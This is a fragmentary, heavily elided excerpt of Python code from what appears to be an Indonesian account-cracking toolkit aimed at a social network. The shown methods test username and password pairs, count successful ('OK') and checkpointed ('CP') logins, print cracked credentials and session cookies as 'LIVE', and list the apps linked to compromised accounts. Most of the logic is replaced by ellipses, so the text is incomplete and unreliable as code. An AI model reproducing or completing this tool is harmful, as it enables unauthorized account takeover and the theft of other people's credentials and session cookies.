...
class Login:
 ...
 {O} _____ _____    _  _____ _   _  ____ 
    ...
    def maling_pangsit(self, cok, tok):
        ...
        try:
            ...
            if "/a/subscriptions/remove" in str(link):
                ...
                prints(Panel(f"      Selamat datang [italic TF ♚ ]{nama}[/] Di Script Asu Toolkit", style="bold white", width=70))
...
-----------------------------------------------------""")
    ...
    def cek_apk(self, user, pw, coki):
        ...
        tree.add(f"[[TF ♚ ]LIVE[/]] {user}|{pw}")

        tree.add(f"[[TF ♚ ]LIVE[/]] [TF ♚ ]{coki}[/]")

        tree.add("Aplikasi Terkait").add(f"Aktif [TF ♚ ]{str(len(self.ak))}[/]").add(aktif)
        ...
        try:
            ...
            for apk in link.find_all("h3"):
                ...
                if "Ditambahkan" in apk.text:
                    ...
                    self.ak.append(f"[TF ♚ ]{str(apk.text).replace('Ditambahkan','[bold white] - Ditambahkan')}")
    ...
    def apiiiiii(self, username, pasw):
        ...
        prog.update(des, description=f"[ <//> ] {str(self.lo)}/{len(self.id)} OK-[TF ♚ ]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
            ...
            try:
                ...
                if "session_key" in xnxx.text:
                    ...
                    if "ya" in self.ya:self.cek_apk(kntl[0], kntl[1], coki)
                        ...
                        tree.add(f"[[TF ♚ ]LIVE[/]] {kntl[0]}|{kntl[1]}")
                    ...
                    prog.update(des, description=f"[ [bold red]spam[/] ] {str(self.lo)}/{len(self.id)} OK-[TF ♚ ]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
